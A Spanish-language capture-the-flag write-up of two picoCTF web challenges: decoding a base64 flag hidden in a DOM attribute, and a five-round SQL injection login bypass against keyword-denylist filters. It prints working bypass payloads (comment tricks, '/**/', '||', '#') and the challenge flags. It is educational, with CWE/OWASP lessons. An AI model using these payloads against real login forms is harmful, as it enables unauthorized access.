# Write-ups picoCTF (Web Exploitation)

## Objetivo
Documentar dos retos de la categoria `Web Exploitation` de picoCTF:
1. **WebDecode** (Easy) - inspeccion del cliente y decodificacion base64.
2. **Web Gauntlet** (Medium) - SQL Injection con bypass progresivo de filtros tipo WAF (cubre el espiritu de "SQLi-Lite").

## Alcance y restriccion etica
Estas pruebas se realizan exclusivamente dentro del entorno oficial de picoCTF. No se replican tecnicas sobre sitios externos ni aplicaciones reales.

---

## Reto 1: WebDecode

- **Nombre exacto del reto:** WebDecode
- **Categoria:** Web Exploitation
- **Dificultad:** Easy
- **Etiquetas:** picoCTF 2024, browser_webshell_solvable
- **Autora:** Nana Ama Atombo-Sackey
- **Descripcion oficial:** *"Do you know how to use the web inspector?"*
- **Captura de la flag:** `evidence/picoctf/challenge_1/picoctf_webdecode_flag.png`

### Logica de resolucion (paso a paso)
1. **Lanzar la instancia.** Desde el dashboard del reto pulsamos **Launch Instance** y abrimos la URL que entrega picoCTF en el navegador. La pagina muestra una interfaz simple con varias secciones (Home, About, Contact).

2. **Primera inspeccion: codigo fuente plano.** Click derecho -> **Ver codigo fuente** (`Ctrl+U`). Revisamos el HTML completo buscando texto con formato `picoCTF{...}`, comentarios `<!-- ... -->` y atributos sospechosos. No encontramos la flag a simple vista.

3. **Inspeccion con DevTools.** Pulsamos `F12` para abrir las DevTools y revisamos sistematicamente:
   - Pestana **Elements / Inspector**: recorrimos el DOM seccion por seccion. En una de las secciones encontramos un atributo personalizado del estilo `data-content="..."` con un valor que se veia codificado (caracteres alfanumericos terminando en `=`).
   - Pestana **Network**: confirmamos que el navegador no recibia mas archivos de los visibles.
   - Pestana **Sources / Debugger**: revisamos los JS estaticos, sin nada relevante.
   - Pestana **Console**: limpia.

4. **Identificacion del patron base64.** El valor encontrado tenia el patron tipico de **base64**: caracteres `[A-Za-z0-9+/]` y padding `=` al final. La pista del reto (`Web` + `Decode`) confirmaba que habia que decodificarlo.

5. **Decodificacion.** Probamos directamente desde la consola del navegador con la funcion nativa:
   ```js
   atob("cGljb0NURntXZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9")
   ```
   Tambien funciona desde terminal:
   ```bash
   echo "cGljb0NURntXZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9" | base64 -d
   ```
   La salida es la flag en claro.

6. **Submit.** Pegamos la flag en el campo **Submit Flag** y picoCTF la valida como correcta.

### Datos obtenidos
- **Donde aparecio la cadena codificada:** atributo `data-*` dentro de un elemento del DOM, visible solo desde DevTools.
- **Tecnica de decodificacion usada:** base64 (`atob()` en consola del navegador).
- **Flag obtenida:** `picoCTF{web_succ3ssfully_d3c0ded_07b91c79}`

### Vulnerabilidad / mala practica representada
Este reto ilustra **CWE-540: Inclusion of Sensitive Information in Source Code** y **CWE-200: Exposure of Sensitive Information**. La leccion principal es que **codificar no es cifrar**: base64 es solo una representacion ASCII reversible de cualquier dato, no un control de seguridad. Cualquier cosa entregada al navegador (HTML, atributos, JS, comentarios) es publica de facto y puede inspeccionarse trivialmente. Mapea razonablemente a OWASP A02:2025 Security Misconfiguration y A06:2025 Insecure Design.

### Evidencia capturada
- Captura final con la flag visible en el campo **Submit Flag**: `evidence/picoctf/challenge_1/picoctf_webdecode_flag.png` ✓

---

## Reto 2: Web Gauntlet

- **Nombre exacto del reto:** Web Gauntlet
- **Categoria:** Web Exploitation
- **Dificultad:** Medium
- **Captura de la flag:** `evidence/picoctf/challenge_2/picoctf_web_gauntlet_flag.png`

### Contexto del reto
Web Gauntlet expone un formulario de login que ejecuta una consulta del tipo:
```sql
SELECT username FROM users WHERE username='<input_user>' AND password='<input_pass>'
```
La aplicacion bloquea progresivamente palabras clave en cada ronda. El objetivo es autenticarse como `admin` superando los filtros impuestos en cinco rondas. Este reto cubre el tema de SQL Injection con filtros tipo WAF (equivalente a "SQLi-Lite") y conecta directamente con la regla ModSecurity del literal 4.

### Reconocimiento previo: filter.php
La pagina `filter.php` muestra los filtros activos en cada ronda. Al revisarla con `highlight_file()` (cuando se llega a la ronda 6) descubrimos su codigo fuente, que ademas contiene la flag final en un comentario PHP. Filtros vistos en el codigo:

| Ronda | Palabras / caracteres bloqueados |
|---|---|
| 1 | `or` |
| 2 | `or`, `and`, `like`, `=`, `--` |
| 3 | espacio, `or`, `and`, `=`, `like`, `>`, `<`, `--` |
| 4 | espacio, `or`, `and`, `=`, `like`, `>`, `<`, `--`, `admin` |
| 5 | espacio, `or`, `and`, `=`, `like`, `>`, `<`, `--`, `union`, `admin` |
| >= 6 | (no hay filtros: `highlight_file("filter.php")` muestra el codigo fuente) |

### Logica de resolucion (paso a paso)

#### Ronda 1 - filtro: `or`
La consulta usa una comparacion de igualdad y termina con `AND password='...'`. Cerramos el string del username y comentamos el resto:
```
usuario:  admin'--
password: x
```
La consulta resultante:
```sql
SELECT username FROM users WHERE username='admin'-- ' AND password='x'
```
El `--` comenta `' AND password='x'`. El servidor encuentra la fila de admin y avanza a la ronda 2.

#### Ronda 2 - filtro: `or`, `and`, `like`, `=`, `--`
Ahora `--` esta bloqueado. Cambiamos a comentario de bloque `/* ... */` repartido entre los dos campos:
```
usuario:  admin'/*
password: */
```
La consulta resultante:
```sql
SELECT username FROM users WHERE username='admin'/*' AND password='*/'
```
El bloque `/* ... */` engulle `' AND password='`, dejando la consulta efectiva como `... WHERE username='admin''`. Avanza a la ronda 3.

#### Ronda 3 - filtro: espacio, `or`, `and`, `=`, `like`, `>`, `<`, `--`
Se prohiben los espacios. La tecnica de la ronda 2 sigue funcionando porque **no usa espacios**: solo comillas, `/*`, `*/` y la palabra `admin`. Reusamos el mismo payload:
```
usuario:  admin'/*
password: */
```
Avanza a la ronda 4.

#### Ronda 4 - filtro: ... + `admin`
Ahora la cadena `admin` esta filtrada. No podemos escribir `admin` literal. Como la base de datos suele tener `admin` como primer registro de la tabla `users`, podemos forzar que la consulta seleccione la primera fila sin nombrar a admin:
```
usuario:  '/**/||/**/1#
password: x
```
La consulta resultante:
```sql
SELECT username FROM users WHERE username=''/**/||/**/1#' AND password='x'
```
- `/**/` es un comentario vacio que el parser de MySQL trata como espacio (sin disparar el filtro de espacio).
- `||` es el operador OR de string en SQL estandar (no contiene la subcadena `or`, asi que pasa el filtro).
- `1` es siempre verdadero, asi que la condicion devuelve todas las filas; MySQL retorna la primera que es `admin`.
- `#` comenta el resto de la consulta. (`#` no esta filtrado; `--` si.)

Avanza a la ronda 5.

#### Ronda 5 - filtro: ... + `union`
La palabra `union` se suma al filtro, pero nuestra solucion **no usa UNION**. Reusamos el payload de la ronda 4:
```
usuario:  '/**/||/**/1#
password: x
```
Avanza a la ronda 6.

#### Ronda 6 - revelacion del codigo fuente
En ronda 6 ya no hay filtros activos. Visitamos directamente `/filter.php`, que ahora ejecuta `highlight_file("filter.php")` y vuelca el codigo fuente PHP en el navegador. Buscamos en el listado y al final del archivo aparece el comentario:
```php
// picoCTF{y0u_m4d3_1t_79a0ddc6}
```

### Datos obtenidos
- **Numero total de rondas superadas:** 5 (al pasarlas se desbloquea la fuga de fuente en ronda 6).
- **Payload de la ronda final (5):** `'/**/||/**/1#` como username, cualquier valor como password.
- **Filtros relevantes en la ronda final:** espacio, `or`, `and`, `=`, `like`, `>`, `<`, `--`, `union`, `admin`.
- **Flag obtenida:** `picoCTF{y0u_m4d3_1t_79a0ddc6}`

### Vulnerabilidad / mala practica representada
Este reto ilustra **CWE-89: SQL Injection** y, en particular, el patron de defensa fallida basado en **denylist de palabras clave** en lugar de **consultas parametrizadas** (prepared statements). Mapea a OWASP A05:2025 Injection. Lecciones clave:
- Una denylist es siempre incompleta: `||` evita `or`, `/**/` evita el filtro de espacio, `#` evita `--`.
- La unica solucion correcta es separar codigo y datos con consultas parametrizadas; ningun filtro lexico cubre todos los caminos del parser SQL.
- Ademas, exponer codigo fuente con `highlight_file` (CWE-540) deja secretos como flags o credenciales al alcance de quien sepa visitar la URL.

### Evidencia capturada
- Captura final con la flag pegada en el campo **Submit Flag**: `evidence/picoctf/challenge_2/picoctf_web_gauntlet_flag.png` ✓

---

## Nota editorial
Este documento conserva solo el contenido explicativo y las referencias a evidencia realmente incluida en el repositorio. No se incluyen listas de progreso ni notas internas de trabajo.
